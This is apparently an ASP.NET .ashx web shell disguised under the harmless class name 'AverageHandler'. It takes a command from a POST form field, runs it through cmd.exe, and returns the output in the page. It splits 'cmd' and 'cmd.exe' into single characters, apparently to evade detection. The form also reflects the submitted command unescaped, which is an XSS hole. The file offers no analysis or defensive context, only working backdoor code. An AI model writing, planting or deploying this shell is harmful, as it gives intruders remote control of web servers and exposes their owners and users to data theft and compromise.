<% @ webhandler language="C#" class="AverageHandler" %>

using System;
using System.Web;
using System.Diagnostics;
using System.IO;

public class AverageHandler : IHttpHandler
{
  public bool IsReusable
  {
    get { return true; }
  }

  public void ProcessRequest(HttpContext ctx)
  {
    Uri url = new Uri(HttpContext.Current.Request.Url.Scheme + "://" +   HttpContext.Current.Request.Url.Authority + HttpContext.Current.Request.RawUrl);

    string command = ctx.Request.Form["c" + "m" + "d"];
    ctx.Response.Write("<form method='POST'>Command: <input name='cmd' value='"+command+"'><input type='submit' value='Run'></form>");
    ctx.Response.Write("<hr>");
    ctx.Response.Write("<pre>");

    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "c" + "m" + "d" + "." + "e" + "x" + "e";
    psi.Arguments = "/c "+command;
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    StreamReader stmrdr = p.StandardOutput;
    string s = stmrdr.ReadToEnd();
    stmrdr.Close();

    ctx.Response.Write(System.Web.HttpUtility.HtmlEncode(s));
    ctx.Response.Write("</pre>");
    ctx.Response.Write("<hr>");
 }
}